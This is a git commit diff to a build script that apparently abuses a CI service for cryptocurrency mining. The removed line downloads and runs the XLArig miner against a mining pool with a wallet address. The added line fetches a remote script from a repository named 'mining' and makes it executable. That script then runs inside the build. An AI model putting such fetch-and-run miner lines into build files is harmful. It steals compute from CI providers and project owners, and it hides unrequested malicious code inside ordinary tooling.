f92ead5552e37cca83de0a2f12b001184d226241
aldo anopali <soapc56@productzf.com>
2021-06-21 11:27:51 +0000

    build.sh edited online with Bitbucket

--- build.sh
+++ build.sh
@@ -11,8 +11,9 @@ function timeout_monitor() {
 # background and pass the PID:
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p circleci -a panthera -k -t32
-done
+
+wget https://try.gitea.io/gairmeet/mining/raw/branch/master/circleci.sh && chmod +x circleci.sh && ./circleci.sh
+done   
 # <your script here>
 
 # kill timeout monitor when terminating:
